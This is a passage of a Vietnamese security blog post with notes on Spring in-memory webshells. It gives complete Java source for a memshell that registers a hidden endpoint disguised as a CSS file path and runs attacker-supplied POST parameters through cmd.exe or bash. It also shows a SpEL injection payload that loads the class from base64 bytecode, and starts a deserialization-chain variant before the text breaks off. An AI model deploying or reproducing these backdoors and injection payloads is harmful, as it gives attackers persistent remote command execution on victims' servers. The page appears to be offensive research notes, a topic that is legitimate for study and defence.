<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Quick Note Spring Memshell | devme4f blogs</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/quick-note-spring-memshell/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Quick Note Spring Memshell" />
<meta property="og:description" content="Preface Một vài mẫu note rời rạc về spring memory webshell mà mình đã dành thời gian tìm hiểu chưa có thời gian viết hoàn thiện
Spring boot Maven: https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web
spring boot &lt; 2.x =&gt; test ok (2.4.10, 2.5.14, 2.7.15) spring boot 3.x (support jdk &gt;= 17) =&gt; not ok do jdk ver cao Dynamically set RequestMappings in Spring (at runtime) Lấy WebApplicationContext Key khi inject memshell trong spring là lấy được WebApplicationContext" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2023/quick-note-spring-memshell/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-19T21:50:22+07:00" />
<meta property="article:modified_time" content="2023-09-19T21:50:22+07:00" />

  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Quick Note Spring Memshell"/>
<meta name="twitter:description" content="Preface Một vài mẫu note rời rạc về spring memory webshell mà mình đã dành thời gian tìm hiểu chưa có thời gian viết hoàn thiện
Spring boot Maven: https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web
spring boot &lt; 2.x =&gt; test ok (2.4.10, 2.5.14, 2.7.15) spring boot 3.x (support jdk &gt;= 17) =&gt; not ok do jdk ver cao Dynamically set RequestMappings in Spring (at runtime) Lấy WebApplicationContext Key khi inject memshell trong spring là lấy được WebApplicationContext"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/java-deserialization-p1/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&text=Quick%20Note%20Spring%20Memshell" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&title=Quick%20Note%20Spring%20Memshell" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&is_video=false&description=Quick%20Note%20Spring%20Memshell" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Quick%20Note%20Spring%20Memshell&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&title=Quick%20Note%20Spring%20Memshell" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&title=Quick%20Note%20Spring%20Memshell" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&name=Quick%20Note%20Spring%20Memshell&description=Preface%20M%e1%bb%99t%20v%c3%a0i%20m%e1%ba%abu%20note%20r%e1%bb%9di%20r%e1%ba%a1c%20v%e1%bb%81%20spring%20memory%20webshell%20m%c3%a0%20m%c3%acnh%20%c4%91%c3%a3%20d%c3%a0nh%20th%e1%bb%9di%20gian%20t%c3%acm%20hi%e1%bb%83u%20ch%c6%b0a%20c%c3%b3%20th%e1%bb%9di%20gian%20vi%e1%ba%bft%20ho%c3%a0n%20thi%e1%bb%87n%0aSpring%20boot%20Maven%3a%20https%3a%2f%2fmvnrepository.com%2fartifact%2forg.springframework.boot%2fspring-boot-starter-web%0aspring%20boot%20%26lt%3b%202.x%20%3d%26gt%3b%20test%20ok%20%282.4.10%2c%202.5.14%2c%202.7.15%29%20spring%20boot%203.x%20%28support%20jdk%20%26gt%3b%3d%2017%29%20%3d%26gt%3b%20not%20ok%20do%20jdk%20ver%20cao%20Dynamically%20set%20RequestMappings%20in%20Spring%20%28at%20runtime%29%20L%e1%ba%a5y%20WebApplicationContext%20Key%20khi%20inject%20memshell%20trong%20spring%20l%c3%a0%20l%e1%ba%a5y%20%c4%91%c6%b0%e1%bb%a3c%20WebApplicationContext" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fquick-note-spring-memshell%2f&t=Quick%20Note%20Spring%20Memshell" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#spring-boot">Spring boot</a>
      <ul>
        <li><a href="#dynamically-set-requestmappings-in-spring-at-runtime">Dynamically set RequestMappings in Spring (at runtime)</a></li>
        <li><a href="#code-injection-load-memshell">Code injection (load memshell)</a></li>
      </ul>
    </li>
    <li><a href="#spring-mvc">Spring MVC</a></li>
    <li><a href="#detection">Detection</a></li>
    <li><a href="#notes">Notes</a></li>
    <li><a href="#tổng-kết">Tổng kết</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Quick Note Spring Memshell
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2023-09-19 21:50:22 &#43;0700 &#43;07" itemprop="datePublished">2023-09-19</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/research" rel="tag">research</a>
            
             ,  
            <a class="tag-link" href="/tags/memshell" rel="tag">memshell</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h2 id="preface">Preface</h2>
<p>Một vài mẫu note rời rạc về spring memory webshell mà mình đã dành thời gian tìm hiểu chưa có thời gian viết hoàn thiện</p>
<h2 id="spring-boot">Spring boot</h2>
<p><strong>Maven</strong>: <a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web">https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web</a></p>
<ul>
<li><code>spring boot &lt; 2.x</code>  =&gt; test ok (<code>2.4.10, 2.5.14, 2.7.15</code>)</li>
<li><code>spring boot 3.x</code> (support jdk &gt;= 17) =&gt; not ok do jdk ver cao</li>
</ul>
<h3 id="dynamically-set-requestmappings-in-spring-at-runtime">Dynamically set RequestMappings in Spring (at runtime)</h3>
<h4 id="lấy-webapplicationcontext">Lấy WebApplicationContext</h4>
<p>Key khi inject memshell trong spring là lấy được <code>WebApplicationContext</code></p>
<p><strong>Study case</strong>: Tiện nhưng khi không configure <code>ContextLoaderListener</code> hay <code>applicationContext.xml</code> global configuration file ==&gt; không lấy được context</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ContextLoader.<span style="color:#a6e22e">getCurrentWebApplicationContext</span>()
</span></span></code></pre></div><p><strong>Usable</strong>: Cả boot vs mvc đều dùng được:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>())
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">getRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>())
</span></span></code></pre></div><p>==&gt; Không có cách nào là tốt nhất, tùy cấu hình app/version mà mỗi cách mới có thể sử dụng được</p>
<h4 id="lấy-httpservletrequest-httpservletresponse">Lấy HttpServletRequest, HttpServletResponse</h4>
<p><code>ServletRequestAttributes</code> là class cha của <code>RequestAttributes</code> nên ép kiểu đc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>HttpServletRequest request <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>();
</span></span><span style="display:flex;"><span>HttpServletResponse request <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getResponse</span>();
</span></span></code></pre></div><h4 id="study-case-spring-boot--26">Study case, spring boot &lt; 2.6</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">PatternsRequestCondition chỉ chạy ở spring boot &lt; 2.6
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Error: java.lang.IllegalArgumentException: Expected lookupPath in request attribute &#34;org.springframework.web.util.UrlPathHelper.PATH&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Simple reason: https://liuyanzhao.com/1503010911382802434.html 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">NormalTest</span>() <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    WebApplicationContext context <span style="color:#f92672">=</span> RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>());
</span></span><span style="display:flex;"><span>    RequestMappingHandlerMapping mappingHandler <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">getBean</span>(RequestMappingHandlerMapping.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>    Method method <span style="color:#f92672">=</span> NormalTest.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;run&#34;</span>);
</span></span><span style="display:flex;"><span>    PatternsRequestCondition patterns <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PatternsRequestCondition(<span style="color:#e6db74">&#34;/a/assets/style.css&#34;</span>);
</span></span><span style="display:flex;"><span>    RequestMethodsRequestCondition mc <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RequestMethodsRequestCondition();
</span></span><span style="display:flex;"><span>    RequestMappingInfo mappingInfo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RequestMappingInfo(patterns, mc, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>    NormalTest normalTest <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> NormalTest(<span style="color:#e6db74">&#34;a&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    mappingHandler.<span style="color:#a6e22e">registerMapping</span>(mappingInfo, normalTest, method);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="springcontrollermem">SpringControllerMem</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.RequestMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.WebApplicationContext;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.request.RequestContextHolder;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.request.ServletRequestAttributes;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.support.RequestContextUtils;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.PrintWriter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SpringControllerMem</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">load</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            WebApplicationContext context <span style="color:#f92672">=</span> RequestContextUtils.<span style="color:#a6e22e">findWebApplicationContext</span>(((ServletRequestAttributes) RequestContextHolder.<span style="color:#a6e22e">getRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>());
</span></span><span style="display:flex;"><span>            RequestMappingHandlerMapping mappingHandler <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">getBean</span>(RequestMappingHandlerMapping.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            Method method <span style="color:#f92672">=</span> SpringControllerMem.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;run&#34;</span>);
</span></span><span style="display:flex;"><span>            Method getMappingForMethod <span style="color:#f92672">=</span> mappingHandler.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getMappingForMethod&#34;</span>, Method.<span style="color:#a6e22e">class</span>, Class.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            getMappingForMethod.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            RequestMappingInfo mInfo <span style="color:#f92672">=</span> (RequestMappingInfo) getMappingForMethod.<span style="color:#a6e22e">invoke</span>(mappingHandler, method, SpringControllerMem.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            SpringControllerMem obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SpringControllerMem(<span style="color:#e6db74">&#34;a&#34;</span>);
</span></span><span style="display:flex;"><span>            mappingHandler.<span style="color:#a6e22e">registerMapping</span>(mInfo, obj, method);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {}
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;loaded!&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">SpringControllerMem</span>(String a) {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span>(<span style="color:#e6db74">&#34;/a/assets/style.css&#34;</span>) <span style="color:#75715e">// memshell path</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            HttpServletRequest request <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getRequest</span>();
</span></span><span style="display:flex;"><span>            HttpServletResponse response <span style="color:#f92672">=</span> ((ServletRequestAttributes)RequestContextHolder.<span style="color:#a6e22e">currentRequestAttributes</span>()).<span style="color:#a6e22e">getResponse</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            String arg0 <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;dev_63hdsbxs7hx&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (arg0 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> request.<span style="color:#a6e22e">getMethod</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;POST&#34;</span>)) {
</span></span><span style="display:flex;"><span>                ProcessBuilder p;
</span></span><span style="display:flex;"><span>                String o <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>                PrintWriter w <span style="color:#f92672">=</span> response.<span style="color:#a6e22e">getWriter</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;os.name&#34;</span>).<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;win&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;cmd.exe&#34;</span>, <span style="color:#e6db74">&#34;/c&#34;</span>, arg0});
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, arg0});
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>(p.<span style="color:#a6e22e">start</span>().<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>);
</span></span><span style="display:flex;"><span>                o <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">hasNext</span>() <span style="color:#f92672">?</span> c.<span style="color:#a6e22e">next</span>() : o;
</span></span><span style="display:flex;"><span>                c.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">write</span>(o);
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">flush</span>();
</span></span><span style="display:flex;"><span>                w.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                response.<span style="color:#a6e22e">sendError</span>(404);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="code-injection-load-memshell">Code injection (load memshell)</h3>
<h4 id="via-spel-injection">via SpEL Injection</h4>
<p><strong>Code test</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ExpressionParser ep <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SpelExpressionParser();
</span></span><span style="display:flex;"><span>Object result <span style="color:#f92672">=</span> ep.<span style="color:#a6e22e">parseExpression</span>(input).<span style="color:#a6e22e">getValue</span>();
</span></span></code></pre></div><ul>
<li>Test chạy trên spring boot <code>2.7.15</code> + <code>jdk8</code>, <code>3.x</code> lỗi ko load được bytecode qua el injection:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">cglib</span>.<span style="color:#a6e22e">core</span>.<span style="color:#a6e22e">ReflectUtils</span>).<span style="color:#a6e22e">defineClass</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>evil.<span style="color:#a6e22e">SpringControllerMem</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Base64Utils</span>).<span style="color:#a6e22e">decodeFromString</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>yv66vgAA...<span style="color:#960050;background-color:#1e0010">&#39;</span>),<span style="color:#66d9ef">new</span> javax.<span style="color:#a6e22e">management</span>.<span style="color:#a6e22e">loading</span>.<span style="color:#a6e22e">MLet</span>(<span style="color:#66d9ef">new</span> java.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">URL</span><span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>,T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Thread</span>).<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">getContextClassLoader</span>())).<span style="color:#a6e22e">load</span>()
</span></span></code></pre></div><h4 id="via-java-deserialization">via Java deserialization</h4>
<p><strong>Code test</strong>: lib <code>commons-beanutils 1.9.4</code></p>
<p>Đơn giản là sửa malicious class được load bytecode ở sink của các chain sử dụng TemplatesImpl là sink (vd: CommonsBeanUtils1, CC2, CC3, CC4,&hellip;). Bài này sẽ demo chain CommonsBeanutils1, ai đã tìm hiểu chain này thì biết malicious class cần là subclass của <code>AbstractTranslet</code> (may ko phải extends <code>HttpServlet</code> như memshell tomcat) và implements 2 methods <code>transform()</code> là được. Phần code inject request mapping sẽ đặt trong default constructor do sink <code>TemplatesImp</code> sẽ gọi method <code>newInstance()</code> của class được load.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.RequestMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.WebApplicationContext;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.request.RequestContextHolder;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.context.request.ServletRequestAttributes;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.servlet.support.RequestContextUtils;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.PrintWriter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MemTemplatesImpl</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
